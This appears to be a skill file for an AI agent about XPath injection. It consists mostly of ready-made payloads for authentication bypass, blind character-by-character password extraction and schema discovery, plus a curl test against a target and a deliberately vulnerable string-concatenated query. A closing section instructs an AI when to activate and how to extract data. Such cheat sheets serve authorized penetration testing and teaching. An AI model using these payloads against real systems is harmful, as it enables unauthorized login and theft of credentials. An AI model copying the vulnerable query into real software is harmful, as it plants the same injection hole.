# XPath Injection Skill

## Goal

Identify and exploit XPath injection vulnerabilities to extract data from XML databases or bypass authentication.

## Methodology

1. **Identify XPath Context:** Find search or login forms that query XML data
2. **Test for Injection:** Insert XPath syntax to detect evaluation
3. **Bypass Authentication:** Use boolean logic to always-true conditions
4. **Extract Data:** Navigate XML tree structure to extract information
5. **Enumerate Schema:** Use XPath functions to discover node names

## Authentication Bypass Payloads

```xpath
# Basic authentication bypass
' or '1'='1
' or 1=1 or '
" or "1"="1
' or ''='
admin' or '1'='1'--
admin']//*--

# Null password bypass
']//*
']/parent::*]/*
```

## Boolean-Based Injection

```xpath
# Verify injection
' and '1'='1
' and '1'='2

# Data extraction
' or substring(//user[position()=1]/password,1,1)='a
' or substring(//user[position()=1]/password,2,1)='b
```

## XPath Functions for Extraction

```xpath
# Count nodes
' or count(//user)>0 and '1'='1
' or count(//user)=5 and '1'='1

# String length
' or string-length(//user[1]/password)=8 and '1'='1

# Extract data
' or substring(//user[1]/password,1,1)='a' and '1'='1
' or contains(//user[1]/role,'admin') and '1'='1
```

## Schema Discovery

```xpath
# Get node names
' or name(/*[1])='root' and '1'='1
' or name(/root/*[1])='users' and '1'='1

# Count child nodes
' or count(/root/*)>0 and '1'='1
```

## Example Vulnerable Query

```python
# Vulnerable code
query = "//users/user[username/text()='" + user + "' and password/text()='" + pass + "']"

# Injection: user = ' or '1'='1' or '
# Results in: //users/user[username/text()='' or '1'='1' or '' and password/text()='...']
```

## Tools

* **XPath Diver** - XPath injection scanner
* **Burp Suite** - Manual testing
* **xmllint** - Test XPath expressions locally

## Example Commands

```bash
# Test XPath locally
echo "<users><user><name>admin</name></user></users>" | xmllint --xpath "//user/name/text()" -

# Boolean injection test
curl "http://target/search?query=' or '1'='1"
```

## Guidance for AI

* Activate when testing applications that process XML or use XML databases
* Start with single quote `'` to break out of strings
* Use boolean conditions like `or '1'='1` for auth bypass
* For blind extraction, use `substring()` character-by-character
* XPath 1.0 doesn't support error-based extraction; rely on boolean/time-based
* Try both single `'` and double `"` quotes
* Use `position()` to iterate through multiple nodes
